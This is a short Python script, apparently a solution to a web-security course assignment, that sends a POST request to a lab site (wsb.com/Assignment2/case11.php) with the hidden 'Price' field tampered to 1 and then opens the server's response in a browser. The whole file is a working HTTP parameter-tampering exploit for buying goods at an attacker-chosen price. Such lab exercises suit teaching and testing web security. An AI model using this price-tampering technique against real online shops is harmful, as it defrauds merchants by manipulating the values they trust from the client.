import requests
import webbrowser

# Exploit: change the hidden field 'Price' to something affordable
# before making the POST request, hence it's classified under HTTP 
# Requests Parameter Tampering

def main():
    temp = '/tmp/case11.html'
    payload = {'Price':'1', 'qty':'1'}
    r = requests.post('http://wsb.com/Assignment2/case11.php', data=payload)
    with open(temp, 'wb') as f:
        f.write(r.content)
    webbrowser.open(temp, 2)

if __name__ == "__main__":
    main()
